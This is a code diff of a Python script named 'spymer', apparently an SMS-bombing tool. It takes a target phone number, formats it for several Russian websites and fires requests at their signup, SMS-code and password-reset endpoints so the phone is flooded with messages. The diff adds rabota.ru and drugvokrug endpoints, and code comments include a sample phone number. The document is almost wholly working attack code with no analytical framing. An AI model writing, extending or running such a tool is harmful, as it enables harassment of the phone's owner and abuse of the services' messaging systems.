@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# spymer v2
+# spymer v1
 # Author: FSystem88
 class spymer:
 	def main(self):
@@ -30,8 +30,8 @@ class spymer:
 				exit()
 		_phone = args.phonenum
 		iteration = 0			
-		_phone9 = _phone[1:] # '9153509908'
-		_phoneDostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] # '915+350-99-08'
+		_phone9 = _phone[1:]
+		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
 		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
 		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
 		print showstatus(wrapsbrace('info', True) + ('Send SMS to: +{}').format(_phone))
@@ -55,6 +55,8 @@ class spymer:
 			youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
 			youdrive = requests.post('http://youdrive.today/signup/phone', data={'phone': _phone, 'phone_code':'7'})			
 			pizzahut = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
-
+			rabota = requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
+			drugvokrug = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': _phone})
+			
 spammer = spymer()
 spammer.main()
